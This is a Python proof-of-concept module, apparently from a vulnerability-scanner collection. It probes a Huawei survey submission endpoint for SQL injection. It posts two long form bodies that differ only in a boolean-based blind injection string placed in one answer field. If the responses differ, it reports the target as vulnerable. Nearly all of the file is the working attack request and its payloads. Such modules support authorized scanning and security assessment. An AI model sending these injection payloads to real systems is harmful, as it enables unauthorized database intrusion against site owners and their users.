# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Huawei_0103'  # 平台漏洞编号
    name = '华为采集存在SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-23'  # 漏洞公布时间
    desc = '''
    华为采集存在SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=205773
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '华为'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3c78848a-c284-48e6-9974-62f1c3a681ac'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/web/member/memberSurveyAction!answerQuestion.do"
            headers = {
                "Content-Length": "2916",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "Cookie": "JSESSIONID=ADEB3C74B5159E2AC9A0AB6AC0C1050C-n1.jvm1; pvndwvyk=1",
                "Connection": "Keep-alive",
                "Accept-Encoding": "gzip,deflate",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36",
                "Accept": "*/*"
            }
            payload = "answerList[0].optionId=98&answerList[0].optionValue=1&answerList[0].otherOptionId=105&answerList[0].questionId=13&answerList[0].surveyId=2&answerList[1].optionId=106&answerList[1].optionValue=1&answerList[1].otherOptionId=128&answerList[1].questionId=14&answerList[1].surveyId=2&answerList[2].optionId=135&answerList[2].questionId=15&answerList[2].surveyId=2&answerList[3].optionId=129&answerList[3].optionValue=' AND 'Pesh'='Pesh&answerList[3].otherOptionId=134&answerList[3].questionId=16&answerList[3].surveyId=2&answerList[4].checkBoxOptionId=146&answerList[4].checkBoxOptionId=150&answerList[4].checkBoxOptionId=151&answerList[4].checkBoxOptionId=143&answerList[4].checkBoxOptionId=142&answerList[4].checkBoxOptionId=145&answerList[4].checkBoxOptionId=144&answerList[4].checkBoxOptionId=149&answerList[4].checkBoxOptionId=155&answerList[4].checkBoxOptionId=154&answerList[4].checkBoxOptionId=148&answerList[4].checkBoxOptionId=152&answerList[4].checkBoxOptionId=153&answerList[4].checkBoxOptionId=147&answerList[4].checkBoxOptionId=139&answerList[4].checkBoxOptionId=140&answerList[4].checkBoxOptionId=141&answerList[4].optionValue=1&answerList[4].otherOptionId=155&answerList[4].questionId=17&answerList[4].surveyId=2&answerList[5].optionId=156&answerList[5].questionId=18&answerList[5].surveyId=2&answerList[6].checkBoxOptionId=165&answerList[6].checkBoxOptionId=164&answerList[6].checkBoxOptionId=166&answerList[6].checkBoxOptionId=171&answerList[6].checkBoxOptionId=172&answerList[6].checkBoxOptionId=173&answerList[6].checkBoxOptionId=170&answerList[6].checkBoxOptionId=167&answerList[6].checkBoxOptionId=168&answerList[6].checkBoxOptionId=169&answerList[6].optionValue=1&answerList[6].otherOptionId=173&answerList[6].questionId=19&answerList[6].surveyId=2&answerList[7].optionId=174&answerList[7].questionId=20&answerList[7].surveyId=2&answerList[8].checkBoxOptionId=178&answerList[8].checkBoxOptionId=179&answerList[8].checkBoxOptionId=176&answerList[8].checkBoxOptionId=177&answerList[8].checkBoxOptionId=181&answerList[8].checkBoxOptionId=180&answerList[8].optionValue=1&answerList[8].otherOptionId=181&answerList[8].questionId=21&answerList[8].surveyId=2&answerList[9].optionId=182&answerList[9].questionId=22&answerList[9].surveyId=2&siteId=5&struts.token.name=token&surveyMember.company=Baidua&surveyMember.country=AFG&surveyMember.genderCode=female&surveyMember.memberEmail=sample@email.tst&surveyMember.memberMobile=987-65-4329&surveyMember.memberName=gchifnyx&token=FF0W0EV4KWRB3I4X4DY61XQPYGPEOV7F"
            payload1 = "answerList[0].optionId=98&answerList[0].optionValue=1&answerList[0].otherOptionId=105&answerList[0].questionId=13&answerList[0].surveyId=2&answerList[1].optionId=106&answerList[1].optionValue=1&answerList[1].otherOptionId=128&answerList[1].questionId=14&answerList[1].surveyId=2&answerList[2].optionId=135&answerList[2].questionId=15&answerList[2].surveyId=2&answerList[3].optionId=129&answerList[3].optionValue=' AND 'Pesh'='hyhmnn&answerList[3].otherOptionId=134&answerList[3].questionId=16&answerList[3].surveyId=2&answerList[4].checkBoxOptionId=146&answerList[4].checkBoxOptionId=150&answerList[4].checkBoxOptionId=151&answerList[4].checkBoxOptionId=143&answerList[4].checkBoxOptionId=142&answerList[4].checkBoxOptionId=145&answerList[4].checkBoxOptionId=144&answerList[4].checkBoxOptionId=149&answerList[4].checkBoxOptionId=155&answerList[4].checkBoxOptionId=154&answerList[4].checkBoxOptionId=148&answerList[4].checkBoxOptionId=152&answerList[4].checkBoxOptionId=153&answerList[4].checkBoxOptionId=147&answerList[4].checkBoxOptionId=139&answerList[4].checkBoxOptionId=140&answerList[4].checkBoxOptionId=141&answerList[4].optionValue=1&answerList[4].otherOptionId=155&answerList[4].questionId=17&answerList[4].surveyId=2&answerList[5].optionId=156&answerList[5].questionId=18&answerList[5].surveyId=2&answerList[6].checkBoxOptionId=165&answerList[6].checkBoxOptionId=164&answerList[6].checkBoxOptionId=166&answerList[6].checkBoxOptionId=171&answerList[6].checkBoxOptionId=172&answerList[6].checkBoxOptionId=173&answerList[6].checkBoxOptionId=170&answerList[6].checkBoxOptionId=167&answerList[6].checkBoxOptionId=168&answerList[6].checkBoxOptionId=169&answerList[6].optionValue=1&answerList[6].otherOptionId=173&answerList[6].questionId=19&answerList[6].surveyId=2&answerList[7].optionId=174&answerList[7].questionId=20&answerList[7].surveyId=2&answerList[8].checkBoxOptionId=178&answerList[8].checkBoxOptionId=179&answerList[8].checkBoxOptionId=176&answerList[8].checkBoxOptionId=177&answerList[8].checkBoxOptionId=181&answerList[8].checkBoxOptionId=180&answerList[8].optionValue=1&answerList[8].otherOptionId=181&answerList[8].questionId=21&answerList[8].surveyId=2&answerList[9].optionId=182&answerList[9].questionId=22&answerList[9].surveyId=2&siteId=5&struts.token.name=token&surveyMember.company=Baidua&surveyMember.country=AFG&surveyMember.genderCode=female&surveyMember.memberEmail=sample@email.tst&surveyMember.memberMobile=987-65-4329&surveyMember.memberName=gchifnyx&token=FF0W0EV4KWRB3I4X4DY61XQPYGPEOV7F"
            _response = requests.post(url, data=payload, headers=headers)
            _response1 = requests.post(url, data=payload1, headers=headers)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
